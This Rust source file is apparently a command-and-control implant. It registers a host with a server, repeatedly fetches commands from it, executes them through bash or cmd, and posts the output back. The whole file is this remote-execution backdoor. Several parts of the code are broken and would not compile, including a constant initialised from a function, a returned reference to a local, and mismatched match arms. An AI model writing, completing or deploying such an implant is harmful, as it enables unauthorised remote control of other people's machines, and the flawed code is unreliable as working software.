//Get local IP and OS, make a POST request to [SERVER]/newHost and record identifier
//Constantly pull the page [SERVER]/IDENTIFIER/commands and POST results to [SERVER]/IDENTIFIER/responses

use reqwest::blocking::Client;
use std::{thread,time};
use std::process::{Command, Stdio};
use std::time::Duration;
use std::env::set_current_dir;
use std::path::Path;
use wait_timeout::ChildExt;
use std::io::Read;

const sleep_time: Duration = time::Duration::from_millis(5000);
const server_ip: &str = "http://127.0.0.1:8080";
const identifier: &str = initHost();

fn initHost() -> &str{
    let mut ip = "";
    let mut os = "";
    if cfg!(windows) {
        os = "Windows";
        ip = "10.1.1.10";
    } else if cfg!(unix) {
        os = "Linux";
        ip = "10.1.1.10";
    }
    let text = format!("{{\'IP\': \'{}\', \'OS\': \'{}\'}}",ip,os);
    let client = reqwest::blocking::Client::new();
    let url = format!("{}/hosts/newHost",server_ip);
    let hostname = match client.post(url).json(&text).send(){
        Ok(ok)=>{
            ok.text().unwrap()
        }, Err(_)=>{
            print(&"Can't connect to server");
            let sleep_time = time::Duration::from_millis(5000);
            thread::sleep(sleep_time);
            initHost()
        }
    }.to_string();
    print(&hostname);
    return &hostname;
}

fn getCommands(identifier:&str){
    let commands_url = format!("{}/hosts/{}/commands",server_ip,identifier);
    let checkin_url = format!("{}/hosts/{}/checkIn",server_ip,identifier);
	let client = Client::new();
	let res = match client.get(commands_url).send(){
        Ok(ok)=>{
            ok.text().unwrap()
        }, Err(_)=>{
            print(&"Can't connect to server");
            let sleep_time = time::Duration::from_millis(5000);
            thread::sleep(sleep_time);
            initHost()
        }
    };
    let res = format!(r#"{}"#,res);
    println!("{}",res);
    let res = json::parse(&res).unwrap();
    let command_count: i32 = format!("{}",res["command_count"]).parse().unwrap();    
    let mut count = 1;
    if command_count == 0{
        print("no commands, sleeping");
        return
    }
    while count <= command_count{
        let cmd_id = format!("{}",res[format!("{}",count)]["cmd_id"]);
        let command = format!("{}",res[format!("{}",count)]["command"]);
        print("Command Received:");
        print(&format!("\tCommand ID: {}\n\tCommand: {}",&cmd_id, &command));
        count+=1;
        handle_command(&cmd_id, &command);
    }
}

fn handle_command(cmd_id:&str, command:&str){
    //run command
    if command.len() > 2{
        if command.eq("checkIn"){
            post_response(&cmd_id,&"checkIn-pong");
            print("checked in TODO");
            return;
        }
        if command[..=1].eq("cd") { //if the first two letters are cd
            let path = Path::new(&command[3..]); //the path is the remaining
            set_current_dir(path);
            let cmd_out = &run_command(&"pwd");
            post_response(&cmd_id, &cmd_out);
        } else{
            let cmd_out = &run_command(&command);
            post_response(&cmd_id, &cmd_out);
        }
    }else{
        let cmd_out = &run_command(&command);
        post_response(&cmd_id, &cmd_out);
    }
}

fn run_command(cmd: &str) -> String {
    let child = if !cfg!(target_os ="windows"){
        let mut child = match Command::new("/bin/bash").arg("-c").arg(cmd).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn(){
            Ok(out)=>{
                out
            }
            Err(e)=>{
                return format!("");
            }
        };
        let three_sec = Duration::from_secs(3);
        let status_code = match child.wait_timeout(three_sec).unwrap() {
            Some(status) => status.code(),
            None => {
                match child.kill(){
                    Ok(_)=>{
                        "Process killed."
                    }
                    Err(_)=>{
                        "Process could not be killed."
                    }
                };
                child.wait().unwrap().code()
            }
        };
        child
    } else{
        Command::new("cmd").arg("/c").arg(cmd).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap()
    };
    let mut stdout_str = String::new();
    let mut stdout = child.stdout.unwrap();
    let mut stderr_str = String::new();
    let mut stderr = child.stderr.unwrap();
    stdout.read_to_string(&mut stdout_str);
    stderr.read_to_string(&mut stderr_str);
    let cmd_out = format!("{}{}",stderr_str,stdout_str);
    if cmd_out.ends_with('\n') { return cmd_out[0..cmd_out.len() - 1].to_string() }
    return cmd_out;
}

fn post_response(cmd_id: &str, response: &str){
    let responses_url = format!("{}/hosts/{}/responses",server_ip, identifier);
    print(&format!("\tcmd_id: {}\n\tResponse: {}",cmd_id,response));
    let text = format!("{{\"cmd_id\": \"{}\",\"response\": \"{}\"}}",cmd_id,response);
    let client = reqwest::blocking::Client::new();
    let res = match client.post(&responses_url).json(&text).send(){
        Ok(ok)=>{
            ok
        }, Err(_)=>{
            print(&"Can't connect to server");
            let sleep_time = time::Duration::from_millis(5000);
            thread::sleep(sleep_time);
            initHost()
        }
    };
    print("Successfully posted response to server.")
}

fn print(txt:&str){
    let print_bool: bool = true;
    if print_bool{
        println!("{}",txt);
    }
}

fn main(){
    loop{
        getCommands(&identifier);
        thread::sleep(sleep_time);
    }
}